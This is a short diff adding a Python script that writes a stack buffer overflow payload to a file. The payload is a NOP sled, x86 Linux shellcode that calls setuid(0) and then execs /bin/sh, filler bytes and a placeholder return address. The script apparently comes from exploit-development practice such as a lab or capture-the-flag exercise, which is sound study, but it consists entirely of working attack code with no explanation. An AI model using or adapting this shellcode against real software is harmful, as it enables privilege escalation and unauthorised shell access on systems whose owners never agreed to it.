@@ -1,0 +1,22 @@
+#!/bin/python3
+from pathlib import Path
+
+nopsled = b'\x90' * 64 
+shellcode = (
+b'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
+b'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
+b'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+)
+
+print("Shellcode length is %d" % len(shellcode))
+
+padding = b'A' * (112 - 64 - 32)
+eip = b'1234'
+
+somefile = Path('e3')
+with somefile.open('wb') as fhandle:
+	fhandle.write(nopsled)
+	fhandle.write(shellcode)
+	fhandle.write(padding)
+	fhandle.write(eip)
+	fhandle.write(b'\n')
